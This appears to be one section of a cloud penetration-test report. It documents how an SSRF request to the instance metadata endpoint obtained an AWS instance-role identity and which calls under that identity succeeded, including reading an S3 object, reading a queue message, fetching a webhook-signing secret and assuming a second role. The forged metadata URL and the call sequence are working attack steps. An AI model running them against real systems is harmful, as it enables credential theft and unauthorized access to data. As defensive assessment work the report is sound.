# 2 — Instance Workload Identity and Executed Reach

## Entry point

The identity was obtained through the server-side fetch described in `1-door.md`. The forged request was:

```text
GET /admin/catalog/image-import?src=http://169.254.169.254/latest/meta-data/iam/security-credentials/marlowe-web-instance-role
```

The response was a credential document for `marlowe-web-instance-role`. Credential values are omitted from this report.

## Principal established by STS

With the returned temporary credentials, `aws sts get-caller-identity` returned:

```json
{
  "UserId": "AROAXI4CLO5WCDXO762J4:i-0marlowe",
  "Account": "500100200300",
  "Arn": "arn:aws:sts::500100200300:assumed-role/marlowe-web-instance-role/i-0marlowe"
}
```

The principal is the assumed role `marlowe-web-instance-role` in account `500100200300`, session `i-0marlowe`, role ID `AROAXI4CLO5WCDXO762J4`.

## Evidence status

Event IDs and request IDs below are recorded from the operator's session transcript. They have **not** been verified against CloudTrail: the review profile `appsec-reviewer` returned `AccessDeniedException` for `cloudtrail:LookupEvents`, and no other log source was available. Each row's response is the output the operator recorded in the session.

## Executed calls under this identity

Each row is a call made with the instance-role credentials above. Request bodies, queue messages, and secret values are not reproduced. Every request was limited to one target.

| # | Executed request | Recorded response (session) | CloudTrail check | Proven permission and target |
|---|---|---|---|---|
| 1 | `aws s3api get-object --bucket marlowe-orders-mc4e21 --key orders/2026-Q1.json /dev/null --query '{ETag:ETag,ContentLength:ContentLength}'` | Success. ETag `"074aacc1288e394e327be2402780c18c"`, ContentLength `1868`. Event `14772654-5be6-43dc-b38a-f6c3458e0133`, request `8ihFkBAXRgiUXYmPDXAGAXHEEpswVJLW6oEgVKjkhffXqFBcTiAX`, 21:14:06Z. | Not verified | `s3:GetObject` on `s3://marlowe-orders-mc4e21/orders/2026-Q1.json`. Body written to `/dev/null`. |
| 2 | `aws sqs receive-message --queue-url https://sqs.eu-west-1.amazonaws.com/500100200300/marlowe-customer-events --max-number-of-messages 1 --visibility-timeout 0 --query 'Messages[].MessageId'` | Success. Message ID `b438c850-07d0-4c51-a93f-4e4d38dd0336`. Event `2f87e3d9-7cc2-408c-b4ec-6b13a247557b`, request `xHUDptXO3ZRPq29f3B7A0nOX74JGzPfrAf5fPGN9zVvEUAeIXrEm`, 21:14:07Z. | Not verified | `sqs:ReceiveMessage` on `marlowe-customer-events`. Visibility reset to zero. Body omitted. |
| 3 | `aws secretsmanager get-secret-value --secret-id marlowe/stripe-webhook-signing --query '{ARN:ARN,Name:Name,VersionId:VersionId}'` | Success. ARN `arn:aws:secretsmanager:eu-west-1:500100200300:secret:marlowe/stripe-webhook-signing-OZUeBE`, version `fccb4133-4ad9-413d-ad92-5083a55d0eaa`. Event `4c5221b8-0aa6-439c-8a17-eb1099f0efe5`, request `ZdoxkXFkUKINV6V7Dtc4uIgiHGBjsibkOUAzXyn085q2eamVuqWn`, 21:14:08Z. | Not verified | `secretsmanager:GetSecretValue` on the signing secret. Secret value not printed. |
| 4 | `aws iam list-users` | `AccessDenied` (not authorized for `iam:ListUsers`). Event `25b379b9-793f-4c8e-899c-e4e261031117`, request `mDOGL1BPwxPc6dMe063RvUTZalTzLqFdPJcDZnEF1y4iFUNYbbNI`, 21:14:09Z. | Not verified | This identity is denied `iam:ListUsers`. |
| 5 | `aws sts assume-role --role-arn arn:aws:iam::500100200300:role/marlowe-order-processor-role --role-session-name perimeter-review` | Success. STS returned `arn:aws:sts::500100200300:assumed-role/marlowe-order-processor-role/perimeter-review` in account `500100200300`. Request ID not recorded. | Not verified; request ID not obtained | `sts:AssumeRole` on the function execution role. The resulting identity is the function execution role, whose excess reach is documented in `4-function_chain.md`. |

## Identity policy: granted but not executed

The attached policy `arn:aws:iam::500100200300:policy/MarloweInstanceRolePolicy` (default version `v1`) is the only policy attached to the role, and the role has no inline policies or permissions boundary. The statements below are policy grants. Only rows marked as executed have call-and-response evidence.

| Statement | Actions | Resource scope | Executed here |
|---|---|---|---|
| `Orders` | `s3:GetObject` | `arn:aws:s3:::marlowe-orders-mc4e21/*` | Yes (row 1) |
| `Orders` | `s3:ListBucket`, `s3:PutObject` | `arn:aws:s3:::marlowe-orders-mc4e21` and `/*` | No |
| `CustomerQueue` | `sqs:ReceiveMessage` | `*` | Yes (row 2) |
| `CustomerQueue` | `sqs:GetQueueUrl`, `sqs:GetQueueAttributes` | `*` | No |
| `AssumeFunctionRole` | `sts:AssumeRole` | `arn:aws:iam::500100200300:role/marlowe-order-processor-role` | Yes (row 5) |
| `ReadWebhookSecret` | `secretsmanager:GetSecretValue` | `arn:aws:secretsmanager:*:500100200300:secret:marlowe/stripe-webhook-signing*` | Yes (row 3) |

## Conclusion

The workload identity obtained through the forged metadata request is `marlowe-web-instance-role`. Under that identity, the session recorded the following successful calls: `s3:GetObject` on one order object, `sqs:ReceiveMessage` on the customer-events queue, `secretsmanager:GetSecretValue` on the webhook-signing secret, and `sts:AssumeRole` into the function execution role. `iam:ListUsers` was denied.

These results come from the operator's session record. They are not yet confirmed against CloudTrail, and row 5 has no request ID.

Actions listed in the identity policy but not executed (`s3:ListBucket`, `s3:PutObject`, `sqs:GetQueueUrl`, `sqs:GetQueueAttributes`) are not claimed as demonstrated reach.

The request-forgery entry point and the metadata remediation test are documented in `1-door.md`.
